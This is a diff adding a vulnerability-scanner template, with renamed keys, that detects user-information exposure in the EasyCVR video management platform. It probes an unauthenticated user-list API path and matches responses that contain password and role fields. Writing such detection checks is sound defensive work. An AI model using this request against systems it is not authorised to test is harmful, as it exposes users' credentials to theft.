@@ -1,0 +1,30 @@
+id: easycvr-info-leak
+brief:
+    title: EasyCVR video management - Users Information Exposure
+    by: pussycat0x
+    level: high
+    about: EasyCVR video management platform has leaked user information
+    label:
+        - unauth
+        - easycvr
+        - misconfig
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/v1/userlist?pageindex=0&pagesize=10'
+      signs:
+        - "on": word
+          has:
+            - count
+            - Password
+            - RoleId
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
